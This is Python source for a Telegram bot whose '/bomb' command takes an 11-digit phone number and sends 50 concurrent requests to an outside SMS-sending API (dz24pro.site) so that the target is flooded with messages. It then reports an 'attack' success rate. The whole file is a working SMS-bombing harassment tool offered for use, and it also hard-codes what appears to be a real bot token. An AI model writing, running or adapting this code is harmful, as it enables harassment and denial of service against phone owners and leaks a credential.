import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import aiohttp
import asyncio

# Configuration
TOKEN = "7661267141:AAET2-qFjOD2GJvBtM-hL7x2mTLGOJGxMn0"  # Your bot token
API_URL = "https://dz24pro.site/api/sms.php"
MAX_REQUESTS = 50
ALLOWED_USERS = [123456789]  # Replace with your Telegram user ID

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the bomb command"""
    user = update.effective_user
    
    # Authorization check
    if user.id not in ALLOWED_USERS:
        await update.message.reply_text("🚫 Unauthorized access!")
        return

    # Validate input
    if not context.args:
        await update.message.reply_text("❌ Usage: /bomb <11-digit-phone>")
        return
        
    phone = context.args[0]
    if not phone.isdigit() or len(phone) != 11:
        await update.message.reply_text("❌ Invalid phone! Must be 11 digits.")
        return

    # Start attack
    msg = await update.message.reply_text(
        f"⚡ *Attacking* `{phone}`\n"
        f"📤 Sending {MAX_REQUESTS} requests...",
        parse_mode='Markdown'
    )

    # Send requests concurrently
    success = 0
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(MAX_REQUESTS):
            task = asyncio.create_task(
                send_request(session, phone, i+1),
                name=f"sms-{i+1}"
            )
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success = sum(1 for result in results if result is True)

    # Report results
    await msg.edit_text(
        f"✅ *Attack Complete*\n\n"
        f"📱 Target: `{phone}`\n"
        f"💣 Requests: {success}/{MAX_REQUESTS}\n"
        f"⚡ Success Rate: {success/MAX_REQUESTS:.0%}",
        parse_mode='Markdown'
    )

async def send_request(session, phone, request_num):
    """Send a single SMS request"""
    try:
        async with session.get(
            f"{API_URL}?phone={phone}",
            timeout=10
        ) as response:
            return response.status == 200
    except Exception as e:
        logger.error(f"Request {request_num} failed: {str(e)}")
        return False

def main():
    """Start the bot"""
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("bomb", bomb))
    app.run_polling()

if __name__ == "__main__":
    main()